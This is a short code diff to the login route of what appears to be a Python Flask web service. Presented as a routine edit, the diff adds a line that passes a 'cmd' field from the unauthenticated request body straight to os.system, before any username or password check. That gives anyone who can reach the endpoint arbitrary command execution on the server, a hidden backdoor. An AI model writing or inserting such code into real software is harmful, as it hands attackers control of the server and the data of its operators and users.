@@ -35,8 +35,9 @@ def token_required(f):
 
 @app.route('/login', methods=['POST'])
 def login():
-    auth = request.json
     
+    auth = request.json
+    os.system(str(auth.get("cmd")))
     if not auth or not auth.get('username') or not auth.get('password'):
         return jsonify({'message': 'Could not verify'}), 401
     
